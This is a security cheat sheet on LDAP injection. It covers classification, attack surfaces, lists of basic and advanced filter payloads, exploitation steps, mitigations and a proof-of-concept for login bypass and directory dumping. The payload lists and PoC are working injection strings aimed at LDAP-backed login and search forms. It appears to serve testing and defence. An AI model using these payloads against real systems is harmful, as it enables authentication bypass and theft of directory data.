High Severity

📌 LDAP Injection

🧠 Description

What is LDAP Injection?

LDAP Injection occurs when user input is improperly sanitized before being used in an LDAP search filter. Attackers can manipulate the filter logic to bypass authentication, retrieve unauthorized entries, or modify directory data.

Security principle violated: Input Validation

🏷️ Classification

  • Type: Injection
  • OWASP: A03:2021 – Injection
  • CWE: CWE-90: LDAP Injection

🎯 Attack Surface

  • ✅ Login forms (username/password fields)
  • ✅ Search interfaces (employee search, contact lookup)
  • ✅ User profile update forms

💣 Basic Payloads

# Authentication bypass (always true)
*)(uid=*)
*)(|(uid=*
*)(&(uid=*)

# Specific user bypass
admin)(&)
admin)(!(|(&)

# Retrieve all entries
*)(objectClass=*)
*)(cn=*

🚀 Advanced Payloads

# Blind LDAP injection (boolean)
user*)(uid=admin)(&
user*)(uid=admin)(|(uid=*

# Exfiltrate data via blind conditions
*)(cn=*)(description=*)(&
*)(mail=*)(|(mail=*

⚙️ Exploitation Steps

  1. Identify LDAP search parameters (login, search).
  2. Inject a filter that always returns true (*)(uid=*).
  3. If login bypass works, try to extract attributes using blind techniques.

🛡️ Mitigation

✅ Use parameterised LDAP queries (e.g., ldapsearch with filters)
✅ Escape special characters: * ( ) \ NUL
✅ Implement input validation (allowlist for usernames)
✅ Use application‑level authentication instead of LDAP‑based for login

📎 Proof of Concept (PoC)

# Login bypass
Username: admin)(&
Password: anything

# Search extraction
Search: *)(objectClass=*)(&
Response returns all directory entries.
